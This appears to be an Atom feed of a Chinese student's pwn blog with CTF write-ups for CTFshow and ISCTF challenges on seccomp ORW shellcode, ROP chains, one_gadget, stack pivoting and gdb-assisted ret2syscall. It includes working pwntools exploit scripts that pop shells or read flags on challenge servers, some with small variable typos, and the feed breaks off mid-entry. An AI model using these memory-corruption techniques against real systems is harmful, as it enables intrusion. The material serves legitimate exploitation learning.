<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiuTian&#39;s blog</title>
  
  <subtitle>曼彻斯特的天空是蓝色的</subtitle>
  <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
  
  <link href="https://jiutian521.github.io/"/>
  <updated>2025-11-30T10:05:31.080Z</updated>
  <id>https://jiutian521.github.io/</id>
  
  <author>
    <name>JiuTian521</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ret2shellcode与沙箱</title>
    <link href="https://jiutian521.github.io/posts/d9295e2f.html"/>
    <id>https://jiutian521.github.io/posts/d9295e2f.html</id>
    <published>2025-11-30T04:00:00.000Z</published>
    <updated>2025-11-30T10:05:31.080Z</updated>
    
    <content type="html"><![CDATA[<p>这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解</p><h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><p>seccomp函数，它会阻止进程的一部分系统调用，比如我们的execve，这种情况下我们无法直接拿到shell，只能去通过orw，即open-read-write去读出flag文件</p><blockquote><p>seccomp-tools dump .&#x2F;pwn</p></blockquote><p>我们可以通过上述指令查看允许的系统调用</p><h1 id="pwntools的前置语法基础"><a href="#pwntools的前置语法基础" class="headerlink" title="pwntools的前置语法基础"></a>pwntools的前置语法基础</h1><p>我们需要一些pwntools的语法，不过这并不算难</p><blockquote><p>asm(code, vma&#x3D;0, extract&#x3D;True, arch&#x3D;None, os&#x3D;None)</p></blockquote><p>后面三个不用管，我们重点看前两个</p><p>code是必填的，它包含汇编指令的字符串<br>vms是虚拟内存地址，是指定代码被编译时所处的起始地址</p><blockquote><p>asm(shellcraft.你要调用的函数)</p></blockquote><p>shellcraft不仅可以帮助我们生成shellcode的汇编，还可以帮我们生成某个函数的汇编代码，这样就不需要我们自己生成了</p><p>如果我们需要写连续的汇编指令，可以用分分号连接</p><h1 id="eg：ctfshow-pwn69"><a href="#eg：ctfshow-pwn69" class="headerlink" title="eg：ctfshow pwn69"></a>eg：ctfshow pwn69</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400949()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);</span><br><span class="line">  return seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void sub_400906()</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int sub_400A16()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Now you can use ORW to do&quot;);</span><br><span class="line">  read(0, buf, 0x38uLL);</span><br><span class="line">  return puts(&quot;No you don&#x27;t understand I say!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数里存在沙箱，第三个函数里给了我们栈溢出的地方</p><p>一般来说遇到read函数我们就要注意了，因为它通常会限制我们溢出的长度，本题就是只给了我们0x38的余地，这显然是不够的，但是我们注意到main函数里存在mmap函数，可以放到0x123000处</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_16-58-55.4xuz6rej1q.png"></p><p>沙箱只允许我们进行orw这三个函数的系统调用</p><p>我一开始的思路和ret2syscall一样，打算先找寄存器的gadget，但是用ROPgadget尝试找了gadget发现是找不到的，所以这个题主要利用的不全是ROP技术，我们是直接在mmap分配的内存里直接写入汇编指令的，不需要费劲一个个跳转了</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_21-17-26.wizsmiucs.png"></p><p>我们不要用pop rsp，要用jmp rsp</p><blockquote><p>0x0000000000400a01 : jmp rsp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">p=remote(&quot;pwn.challenge.ctf.show&quot;,28296)</span><br><span class="line">mmap_addr=0x123000</span><br><span class="line">jmp_rsp=0x400a01</span><br><span class="line"></span><br><span class="line">#recvuntil不仅仅可以用来接收数据，还可以告诉exp什么时候该发送</span><br><span class="line">p.recvuntil(&quot;Now you can use ORW to do\n&quot;)</span><br><span class="line"></span><br><span class="line">#ORW的板子</span><br><span class="line">shellcode=asm(shellcraft.open(&quot;./ctfshow_flag&quot;))</span><br><span class="line">shellcode+=asm(shellcraft.read(3,mmap_ar,0x100))</span><br><span class="line">shellcode+=asm(shellcraft.write(1,mmap_ar,0x100))</span><br><span class="line"></span><br><span class="line">payload = flat([(asm(shellcraft.read(0,mmap_ar,0x100))+asm(&quot;mov rax,0x123000; jmp rax&quot;)).ljust(0x28,b&#x27;a&#x27;),jmp_rsp,asm(&quot;sub rsp,0x30; jmp rsp&quot;)])</span><br><span class="line"></span><br><span class="line">#先发shellcode，再发paylaod</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在栈迁移里，我们学到在返回地址处，程序调用ret指令，等价于pop rip，会把返回地址弹到rip寄存器里</p><p>我们把read(0,mmap_addr,0x100)，mov rax,0x123000，jmp rax写到缓冲区开始，然后把返回地址改成jmp_rsp，也就是把jmp_rsp的地址弹到rip里，然后rsp随后指向sub rsp,0x30; jmp rsp，也就是把rsp往下减0x30个字节到缓冲区开始，然后再jmp rsp跳转过去。接下来我们执行read(0,mmap_addr,0x100)这个时候程序挂起等待我们输入，并且把输入的内容存到mmap里，然后mov rax,0x123000，jmp rax，跳转到mmap处，开始执行shellcode</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种ret2ORW的题目本质上还是ret2shellcode，只不过需要我们自己套模板，这里的jmp rsp是精妙之处，要重点理解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解&lt;/p&gt;
&lt;h1 id=&quot;沙箱&quot;&gt;&lt;a href=&quot;#沙箱&quot; class=&quot;headerlink&quot; title=&quot;沙箱&quot;&gt;</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
    
    <category term="沙箱" scheme="https://jiutian521.github.io/tags/%E6%B2%99%E7%AE%B1/"/>
    
  </entry>
  
  <entry>
    <title>初识ropchain和one_gadget</title>
    <link href="https://jiutian521.github.io/posts/3bdcf6a2.html"/>
    <id>https://jiutian521.github.io/posts/3bdcf6a2.html</id>
    <published>2025-11-27T16:00:00.000Z</published>
    <updated>2025-11-28T11:39:03.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ropchain"><a href="#Ropchain" class="headerlink" title="Ropchain"></a>Ropchain</h1><p>一把梭工具，非常好用，比较简单就不介绍了</p><p>eg：CTFshow pwn73</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">io=process(&quot;./pwn73&quot;)</span><br><span class="line"># Padding goes here</span><br><span class="line">p = cyclic(0x18+4)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += &#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += &#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de955) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806cc25) # int 0x80</span><br><span class="line">io.recvuntil(&quot;hand!!\n&quot;)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><h2 id="eg：ctfshow-pwn74"><a href="#eg：ctfshow-pwn74" class="headerlink" title="eg：ctfshow pwn74"></a>eg：ctfshow pwn74</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[3]; // [rsp+8h] [rbp-18h] BYREF</span><br><span class="line"></span><br><span class="line">  v4[2] = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(s);</span><br><span class="line">  puts(asc_A80);</span><br><span class="line">  puts(asc_B00);</span><br><span class="line">  puts(asc_B90);</span><br><span class="line">  puts(asc_C20);</span><br><span class="line">  puts(asc_CA8);</span><br><span class="line">  puts(asc_D40);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : PWN_Tricks                                              &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : Use one_gadget a shuttle!                               &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  printf(&quot;What&#x27;s this:%p ?\n&quot;, &amp;printf);</span><br><span class="line">  __isoc99_scanf(&quot;%ld&quot;, v4);</span><br><span class="line">  v4[1] = v4[0];</span><br><span class="line">  ((void (*)(void))v4[0])();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题是NX，PIE，canary保护全开的，打印了printf的地址</p><p>这个题我们不想需要栈溢出，因此canary保护可有可无，而PIE就要求我们libc了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ropchain&quot;&gt;&lt;a href=&quot;#Ropchain&quot; class=&quot;headerlink&quot; title=&quot;Ropchain&quot;&gt;&lt;/a&gt;Ropchain&lt;/h1&gt;&lt;p&gt;一把梭工具，非常好用，比较简单就不介绍了&lt;/p&gt;
&lt;p&gt;eg：CTFshow pwn73&lt;/</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="tools" scheme="https://jiutian521.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>初识栈迁移</title>
    <link href="https://jiutian521.github.io/posts/b824b28e.html"/>
    <id>https://jiutian521.github.io/posts/b824b28e.html</id>
    <published>2025-11-27T16:00:00.000Z</published>
    <updated>2025-11-29T11:52:10.681Z</updated>
    
    <content type="html"><![CDATA[<p>目的：将栈迁移到bss heap libc等上</p><p>leave<br>move esp ebp<br>pop ebp 把栈顶的值弹给EBP寄存器</p><p>ret<br>pop rip 从当前位置弹出值兵赋给rip<br>jmp rip</p><p>函数的退出</p><p>move esp ebp 销毁栈<br>pop ebp 给ebp赋值</p><p>把父函数ebp改成bss段的地址</p><p>销毁步骤正常<br>ebp被修改</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-29_19-41-18.102lxe3v5a.png"></p><p>-00000028 s               db ? 数组s<br>-00000004 var_4           dd ? ida没识别出来的局部变量，表示距离ebp的距离为4<br><strong>+00000000 旧的ebp</strong><br>+00000004  r       db 4 dup(?)  返回地址<br>再往下 参数  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：将栈迁移到bss heap libc等上&lt;/p&gt;
&lt;p&gt;leave&lt;br&gt;move esp ebp&lt;br&gt;pop ebp 把栈顶的值弹给EBP寄存器&lt;/p&gt;
&lt;p&gt;ret&lt;br&gt;pop rip 从当前位置弹出值兵赋给rip&lt;br&gt;jmp rip&lt;/p&gt;
&lt;p&gt;函数的退</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="栈迁移" scheme="https://jiutian521.github.io/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>用gdb调试ret2syscall</title>
    <link href="https://jiutian521.github.io/posts/e4901ff4.html"/>
    <id>https://jiutian521.github.io/posts/e4901ff4.html</id>
    <published>2025-11-26T16:00:00.000Z</published>
    <updated>2025-11-27T13:38:47.886Z</updated>
    
    <content type="html"><![CDATA[<p>题目本身并不难，但是坑还是有的，我们重点关注gdb的使用</p><h1 id="eg-ctfshow-pwn71（32位ret2sycall）"><a href="#eg-ctfshow-pwn71（32位ret2sycall）" class="headerlink" title="eg ctfshow pwn71（32位ret2sycall）"></a>eg ctfshow pwn71（32位ret2sycall）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;===============CTFshow--PWN===============&quot;);</span><br><span class="line">  puts(&quot;Try to use ret2syscall!&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题是静态编译，函数很多，自然想到ret2syscall。在v4存在明显栈溢出漏洞</p><p>这里的坑是ida给的这个0x64的偏移实际上是不准的，需要我们用gdb算一下</p><h1 id="用gdb计算偏移量"><a href="#用gdb计算偏移量" class="headerlink" title="用gdb计算偏移量"></a>用gdb计算偏移量</h1><p>我们先不需要写exp，直接gdb程序即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-14-06.7lkfl27q25.webp"></p><p>先用cyclic 200生成一堆垃圾数，复制下来，或者自己手动打一堆aaaaaaa……也可以</p><p>在gets函数前随便找个地方下断点，然后按r，走到gets输入的地方，把那一堆垃圾数据粘贴并发送过去</p><p>然后用这个指令计算偏移</p><blockquote><p>cyclic -l &lt;EIP&#x2F;RIP的值&gt;</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-31-11.5xb2nw3ah8.webp"></p><p>得到偏移量为112</p><h1 id="灵活使用gadget"><a href="#灵活使用gadget" class="headerlink" title="灵活使用gadget"></a>灵活使用gadget</h1><p>下一步是用ROPgetgad查找pop寄存器，但是我们不可能每次都正好找到完美符合条件的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-36-26.6bhieriaq7.webp"></p><p>这题我们是没法找到单独的pop ecx的，只有一段和ebx连在一起的gadget，不过也可以用，把二者合起来就是了</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;,terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;])</span><br><span class="line"> </span><br><span class="line">#elf = ELF(&#x27;./pwn71&#x27;)</span><br><span class="line"> </span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28251)</span><br><span class="line"> </span><br><span class="line">#io=process(&#x27;./pwn71&#x27;)</span><br><span class="line"></span><br><span class="line">#io=gdb.debug(&quot;./pwn71&quot;,&#x27;b*0x08048E93&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax = 0x080bb196</span><br><span class="line">pop_edx = 0x0806eb6a </span><br><span class="line">pop_ecx_ebx = 0x0806eb91 </span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">bin_sh_addr = 0x080BE408</span><br><span class="line"></span><br><span class="line">#offset = cyclic(200)</span><br><span class="line">offset = 112</span><br><span class="line">payload = offset*b&#x27;a&#x27;</span><br><span class="line">payload = flat([</span><br><span class="line">    offset * b&#x27;a&#x27;,</span><br><span class="line">    0,</span><br><span class="line">    pop_edx,</span><br><span class="line">    0,            </span><br><span class="line">    pop_ecx_ebx,</span><br><span class="line">    bin_sh_addr,     </span><br><span class="line">    pop_eax, 0xb,           </span><br><span class="line">    int_0x80</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;Try to use ret2syscall!&quot;, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="用gdb观察程序流程"><a href="#用gdb观察程序流程" class="headerlink" title="用gdb观察程序流程"></a>用gdb观察程序流程</h1><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-52-02.6wr612wrpv.webp"></p><p>可以看到栈上已经被覆盖了参数</p><p>我们重点看汇编窗口<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-59-02.4g4xm5ywre.webp"></p><p>可以看到四个寄存器已经按照我们payload写的顺序那样，依次被执行对应的操作，</p><p>这里的payload的顺序不重要，因为int80会聪明的自己按照顺序去寻找对应的寄存器，所以只需要保证寄存器的内容正确即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-04-12.7pqccfbmq.webp"></p><p>我们走到int80，输入i r查看所有寄存器，发现每个寄存器都完美的执行了我们想要的操作</p><p>我们也可以在main函数ret的时候用下面的指令查看</p><blockquote><p>x&#x2F;10wx $esp</p></blockquote><p>意思是查看（x）栈顶指针（$esp）位置开始的 10 个（10）单位的数据，每个单位是 4 字节（w），并用十六进制（x）显示出来</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-09-57.7w79e9mlvk.webp"></p><p>我们继续按c走完，成功得到shell<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-06-59.7w79e9irn3.webp"></p><h1 id="使用gdb的注意事项"><a href="#使用gdb的注意事项" class="headerlink" title="使用gdb的注意事项"></a>使用gdb的注意事项</h1><p>1.gets函数是在接收到换行符才会停止输入，所以我们必须用sendline去发payload，如果用send会导致发送完payload后程序还在等待我们输入，直接卡死</p><p>2.我们通过exp去打开gdb时要按c走到断点，千万不能按r，因为程序已经运行了，如果再按一遍r相当于重开了一个新的程序</p><p>3.我们手动输入时，一值n到gets，这时候gdb窗口会换行，这就在提示我们需要输入了，但我们千万不要在gdb窗口输入，而应该去程序执行的窗口输入，否则gdb会卡死</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目本身并不难，但是坑还是有的，我们重点关注gdb的使用&lt;/p&gt;
&lt;h1 id=&quot;eg-ctfshow-pwn71（32位ret2sycall）&quot;&gt;&lt;a href=&quot;#eg-ctfshow-pwn71（32位ret2sycall）&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2syscall" scheme="https://jiutian521.github.io/tags/ret2syscall/"/>
    
  </entry>
  
  <entry>
    <title>IDA常见函数总结</title>
    <link href="https://jiutian521.github.io/posts/ef296182.html"/>
    <id>https://jiutian521.github.io/posts/ef296182.html</id>
    <published>2025-11-24T16:00:00.000Z</published>
    <updated>2025-11-25T16:44:05.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h1><blockquote><p>ssize_t read(int fd, void *buf, size_t count);</p></blockquote><p>fd：文件描述符</p><p>0 表示标准输入（stdin）</p><p>1 表示标准输出（stdout）</p><p>2 表示标准错误（stderr）</p><p>buf：存放读取数据的缓冲区指针（指向内存）</p><p>count：希望读取的字节数</p><blockquote><p>read(0, &amp;s[i], 1uLL);</p></blockquote><p>从标准输入读取 1 个字节，存入 s[i]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;read函数&quot;&gt;&lt;a href=&quot;#read函数&quot; class=&quot;headerlink&quot; title=&quot;read函数&quot;&gt;&lt;/a&gt;read函数&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ssize_t read(int fd, void *buf, size_t co</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>初识gdb的使用与数组越界</title>
    <link href="https://jiutian521.github.io/posts/fe35eb25.html"/>
    <id>https://jiutian521.github.io/posts/fe35eb25.html</id>
    <published>2025-11-24T16:00:00.000Z</published>
    <updated>2025-11-28T09:53:33.703Z</updated>
    
    <content type="html"><![CDATA[<p>开始做ISCTF的真题</p><h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><blockquote><p>题目难度：简单<br>题目描述：你能记住你女朋友的生日嘛？</p></blockquote><p>首先先点评一下，出题人出这个题缝合了两个关卡，把栈溢出，ret2text和数组越界全都考察了一遍，我认为出的水平非常高，符合新生赛要求</p><p>当然这么简单的一个题我居然想了一天，也确实是见识少了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  char s1[8]; // [rsp+28h] [rbp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;welcome to isctf2024&quot;);</span><br><span class="line">  puts(&quot;first i need your team 